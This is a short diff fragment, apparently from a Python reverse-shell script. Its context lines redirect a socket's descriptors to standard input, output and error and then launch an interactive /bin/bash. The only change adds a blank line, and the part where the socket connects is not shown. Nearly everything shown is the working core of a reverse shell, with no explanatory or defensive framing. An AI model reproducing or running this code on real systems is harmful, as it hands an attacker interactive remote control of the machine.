@@ -7,3 +7,4 @@ dup2(s.fileno(),0)
 dup2(s.fileno(),1) 
 dup2(s.fileno(),2) 
 run(["/bin/bash","-i"])
+
